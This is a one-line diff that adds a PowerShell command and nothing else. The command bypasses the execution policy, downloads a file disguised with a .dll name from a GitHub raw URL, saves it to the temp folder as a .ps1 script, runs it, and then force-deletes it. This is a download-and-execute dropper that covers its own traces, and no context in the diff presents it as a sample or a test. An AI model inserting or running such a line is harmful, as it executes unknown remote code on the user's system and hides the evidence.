@@ -1,0 +1,1 @@
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -UseBasicParsing 'https://raw.githubusercontent.com/broodeiko-hue/huesossisississssssssss/main/8jdd23.dll' -OutFile \"$env:TEMP\k9xf.ps1\"; & \"$env:TEMP\k9xf.ps1\"; Remove-Item \"$env:TEMP\k9xf.ps1\" -Force"
